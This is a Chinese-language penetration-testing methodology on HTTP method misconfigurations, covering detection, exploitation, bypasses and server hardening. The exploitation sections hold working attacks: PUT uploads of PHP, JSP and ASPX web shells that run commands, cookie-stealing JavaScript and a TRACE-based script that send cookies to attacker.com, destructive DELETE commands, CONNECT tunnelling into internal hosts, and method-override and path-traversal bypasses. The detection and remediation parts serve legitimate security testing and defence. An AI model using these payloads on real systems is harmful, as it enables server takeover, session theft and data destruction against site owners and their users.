# HTTP 方法测试攻击方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 HTTP 方法配置错误的检测与利用方法论。HTTP 方法配置不当可能导致未授权文件上传、访问控制绕过、跨站追踪等安全风险。

### 1.2 适用范围
- Web 服务器 HTTP 方法配置
- RESTful API 端点
- WebDAV 服务
- 反向代理配置

### 1.3 读者对象
- 渗透测试工程师
- Web 安全分析师
- API 安全测试人员

---

## 第二部分：核心渗透技术专题

### 专题：HTTP 方法测试攻击

#### 2.1 技术介绍

HTTP 方法（HTTP Verbs）定义了客户端可以对服务器资源执行的操作类型。当服务器配置了不必要的或危险的 HTTP 方法时，攻击者可以利用这些方法执行未授权操作。

**HTTP 方法风险分类：**

| 方法 | 风险等级 | 描述 |
|-----|---------|------|
| **PUT** | 🔴 高危 | 可上传任意文件（WebShell） |
| **DELETE** | 🔴 高危 | 可删除关键文件（DoS/破坏） |
| **TRACE** | 🟡 中危 | XST 攻击获取 HttpOnly Cookie |
| **CONNECT** | 🔴 高危 | 建立代理隧道访问内网 |
| **PATCH** | 🟡 中危 | 未授权修改资源 |
| **OPTIONS** | 🟢 低危 | 信息收集（暴露支持的方法） |
| **HEAD** | 🟡 中危 | 可能绕过访问控制 |

**CWE 映射：**

| CWE 编号 | 描述 |
|---------|------|
| CWE-749 | 暴露的危险方法 |
| CWE-284 | 访问控制不当 |
| CWE-693 | 保护机制失效 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **文件管理服务** | 在线文档编辑、云存储 | PUT/DELETE 方法未限制 |
| **RESTful API** | 资源 CRUD 操作 | 方法未正确限制 |
| **WebDAV 服务** | 文件共享、协作编辑 | WebDAV 方法暴露 |
| **反向代理** | 负载均衡、CDN | CONNECT 方法滥用 |
| **传统 CMS** | 内容管理系统 | 旧版本支持危险方法 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. OPTIONS 方法探测**

```bash
# 基本 OPTIONS 请求
curl -X OPTIONS http://target/ -i

# 预期响应
HTTP/1.1 200 OK
Allow: OPTIONS, GET, HEAD, POST

# 危险响应（包含 PUT/DELETE）
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE
```

**2. 直接方法测试**

```bash
# 测试 PUT 方法
curl -X PUT http://target/test.txt -d "test content" -i
# 200/201/204 = 方法允许
# 405 = 方法不允许

# 测试 DELETE 方法
curl -X DELETE http://target/test.txt -i

# 测试 TRACE 方法
curl -X TRACE http://target/ -i
# 响应体应回显请求内容

# 测试 CONNECT 方法
curl -X CONNECT target:443 http://target/ -i
```

**3. 自动化扫描**

```bash
# Nmap http-methods 脚本
nmap --script http-methods -p 80,443 target

# Nmap 详细枚举
nmap --script http-methods --script-args http.method=PUT -p 80 target

# Metasploit 模块
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/trace_axd
```

**4. WebDAV 方法检测**

```bash
# PROPFIND 方法测试
curl -X PROPFIND http://target/ -i

# MKCOL 方法测试（创建目录）
curl -X MKCOL http://target/newdir/ -i

# COPY/MOVE 方法测试
curl -X COPY http://target/file.txt \
  -H "Destination: http://target/copy.txt" -i
```

##### 2.3.2 白盒测试

**1. Apache 配置检查**

```apache
# ❌ 不安全：允许所有方法
<Directory /var/www/html>
    <LimitExcept>
        # 无限制
    </LimitExcept>
</Directory>

# ✅ 安全：仅允许必要方法
<Directory /var/www/html>
    <LimitExcept GET POST HEAD>
        Require all denied
    </LimitExcept>
</Directory>

# 禁用 TRACE 方法
TraceEnable Off
```

**2. Nginx 配置检查**

```nginx
# ❌ 不安全：未限制方法
location / {
    proxy_pass http://backend;
}

# ✅ 安全：限制方法
location / {
    limit_except GET POST HEAD {
        deny all;
    }
    proxy_pass http://backend;
}
```

**3. IIS 配置检查**

```xml
<!-- web.config 检查 -->
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <!-- 检查隐藏动词 -->
        <verbs allowUnlisted="true">
          <add verb="PUT" allowed="false" />
          <add verb="DELETE" allowed="false" />
          <add verb="TRACE" allowed="false" />
        </verbs>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

#### 2.4 漏洞利用方法

##### 2.4.1 PUT 方法文件上传利用

**1. 上传 WebShell**

```bash
# 上传 PHP WebShell
curl -X PUT http://target/shell.php \
  -d '<?php system($_GET["cmd"]); ?>' -i

# 验证上传
curl http://target/shell.php?cmd=id

# 上传其他类型 Shell
curl -X PUT http://target/shell.jsp \
  -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

curl -X PUT http://target/shell.aspx \
  -d '<% Response.Write(new System.Diagnostics.ProcessStartInfo(Request.QueryString["cmd"]).Start()); %>'
```

**2. 上传恶意资源**

```bash
# 上传钓鱼页面
curl -X PUT http://target/login.html \
  -d '<html>...钓鱼页面内容...</html>'

# 上传恶意 JS（窃取 Cookie）
curl -X PUT http://target/static/steal.js \
  -d 'fetch("http://attacker.com/?c="+document.cookie)'
```

##### 2.4.2 DELETE 方法破坏利用

```bash
# ⚠️ 警告：以下为破坏性操作，仅在授权测试中使用

# 删除关键文件
curl -X DELETE http://target/config.php -i

# 删除备份文件
curl -X DELETE http://target/backup/db.sql -i

# 批量删除（如果支持）
curl -X DELETE http://target/api/users/* -i
```

##### 2.4.3 TRACE 方法 XST 攻击

**1. 基础 XST 测试**

```bash
# 发送 TRACE 请求
curl -X TRACE http://target/ \
  -H "Cookie: session=secret123" -i

# 响应应回显请求头
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: target
Cookie: session=secret123
```

**2. XSS + TRACE 组合攻击**

```html
<!-- 攻击页面 -->
<script>
  fetch('http://target/', {
    method: 'TRACE',
    credentials: 'include'
  }).then(r => r.text()).then(data => {
    // 提取 Cookie
    const cookie = data.match(/Cookie: (.*)/)[1];
    fetch('http://attacker.com/?cookie=' + cookie);
  });
</script>
```

##### 2.4.4 CONNECT 方法代理隧道

```bash
# 建立代理隧道
curl -X CONNECT internal-server:3306 \
  -H "Host: internal-server:3306" \
  http://target/

# 使用 Proxychains 通过目标代理
# proxychains.conf 配置
http target.com 80

# proxychains mysql -h internal-db 3306
```

##### 2.4.5 访问控制绕过

**1. HEAD 方法绕过**

```bash
# 直接访问返回 302
curl http://target/admin/ -i
# HTTP/1.1 302 Found
# Location: /login

# 使用 HEAD 方法
curl -X HEAD http://target/admin/ -i
# HTTP/1.1 200 OK
# Set-Cookie: adminSession=xxx
```

**2. 任意方法绕过**

```bash
# 发送未知方法
curl -X FOO http://target/admin/createUser.php \
  -d "username=attacker&role=admin" -i

# 某些框架将未知方法当作 GET 处理
# 可能绕过基于方法的访问控制
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 HTTP 方法绕过技术

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **X-HTTP-Method-Override** | 使用 Header 覆盖方法 | `X-HTTP-Method-Override: DELETE` |
| **X-HTTP-Method** | 微软风格覆盖 | `X-HTTP-Method: PUT` |
| **X-Method-Override** | 通用覆盖 | `X-Method-Override: PATCH` |

**测试步骤：**

```bash
# 1. 确认直接请求被阻止
curl -X DELETE http://target/resource -i
# HTTP/1.1 405 Method Not Allowed

# 2. 尝试 Header 绕过
curl -X POST http://target/resource \
  -H "X-HTTP-Method-Override: DELETE" -i
# HTTP/1.1 200 OK (绕过成功)

# 3. 测试其他变体
curl -X POST http://target/resource \
  -H "X-HTTP-Method: DELETE" -i

curl -X POST http://target/resource \
  -H "X-Method-Override: DELETE" -i
```

##### 2.5.2 URL 路径绕过

```bash
# 路径遍历绕过
curl -X PUT http://target/..;/resource.txt -d "content"

# 添加无关扩展
curl -X PUT http://target/resource.txt;.jsp -d "content"

# 大小写混合（某些服务器）
curl -X PuT http://target/resource.txt -d "content"
```

##### 2.5.3 协议版本绕过

```bash
# 使用 HTTP/0.9（某些旧服务器）
curl -X PUT --http0.9 http://target/resource.txt -d "content"

# 使用 HTTP/2（如果支持）
curl --http2 -X PUT http://target/resource.txt -d "content"
```

---

## 第三部分：附录

### 3.1 HTTP 方法速查表

| 方法 | 安全建议 | 检测命令 |
|-----|---------|---------|
| **GET** | ✅ 允许 | `curl http://target/` |
| **HEAD** | ⚠️ 谨慎 | `curl -I http://target/` |
| **POST** | ✅ 允许 | `curl -X POST -d "" http://target/` |
| **PUT** | ❌ 禁止 | `curl -X PUT -d "" http://target/` |
| **DELETE** | ❌ 禁止 | `curl -X DELETE http://target/` |
| **TRACE** | ❌ 禁止 | `curl -X TRACE http://target/` |
| **CONNECT** | ❌ 禁止 | `curl -X CONNECT target:443` |
| **OPTIONS** | ⚠️ 限制 | `curl -X OPTIONS http://target/` |
| **PATCH** | ⚠️ 谨慎 | `curl -X PATCH -d "" http://target/` |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Nmap** | HTTP 方法枚举 | `nmap --script http-methods target` |
| **cURL** | 手动方法测试 | `curl -X METHOD http://target/` |
| **Burp Suite** | 方法修改测试 | Repeater 模块 |
| **OWASP ZAP** | 自动扫描 | 内置 HTTP 方法扫描 |
| **Metasploit** | 综合测试 | `use auxiliary/scanner/http/` |

### 3.3 修复建议

- [ ] **仅允许必要的 HTTP 方法** - 通常为 GET、POST、HEAD
- [ ] **禁用危险方法** - PUT、DELETE、TRACE、CONNECT
- [ ] **配置方法覆盖防护** - 阻止 X-HTTP-Method-Override 等 Header
- [ ] **实施基于方法的访问控制** - 对不同方法实施不同权限
- [ ] **定期审计配置** - 确保配置未被意外修改
- [ ] **使用 WAF 规则** - 阻止危险方法请求

---

**参考资源：**
- [OWASP WSTG-CONF-06: Test HTTP Methods](https://owasp.org/www-project-web-security-testing-guide/)
- [RFC 7231 - HTTP/1.1 Semantics and Content](https://tools.ietf.org/html/rfc7231)
- [RFC 5789 - HTTP PATCH Method](https://tools.ietf.org/html/rfc5789)
- [CWE-749: Exposed Dangerous Method or Function](https://cwe.mitre.org/data/definitions/749.html)
